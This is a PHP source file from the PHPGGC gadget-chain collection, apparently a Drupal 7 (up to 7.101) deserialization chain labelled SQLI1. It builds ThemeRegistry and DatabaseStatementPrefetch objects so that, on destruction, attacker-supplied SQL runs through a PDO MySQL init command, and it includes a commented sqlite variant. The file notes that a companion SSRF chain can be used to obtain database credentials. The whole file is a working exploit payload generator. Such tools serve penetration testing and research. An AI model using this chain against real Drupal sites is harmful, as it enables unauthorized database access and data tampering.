<?php

namespace GadgetChain\Drupal7;

class SQLI1 extends \PHPGGC\GadgetChain\SqlInjection
{
    public static $version = '<= 7.101';
    public static $vector = '__destruct';
    public static $author = 'paul-axe, mcdruid';
    public static $information = 'See: https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4
    Drupal7/SSRF1 can be used to extract db credentials for SQL injection.';

    public function generate(array $parameters)
    {
        return new \ThemeRegistry(
            new \DatabaseStatementPrefetch(
                'PDO',                                // class
                [
                    'mysql:dbname=db;host=db',        // DSN
                    'db',                             // username
                    'db',                             // password
                    [1002 => $parameters['sql']]      // PDO::MYSQL_ATTR_INIT_COMMAND
                ]
            /**
             * example for sqlite database
             *
                'DatabaseConnection_sqlite',          // class
                [
                    [
                        'database' => 'sites/default/files/.ht.sqlite',
                        'init_commands' => [$parameters['sql']]
                    ]
                ]
             */
            )
        );
    }
}
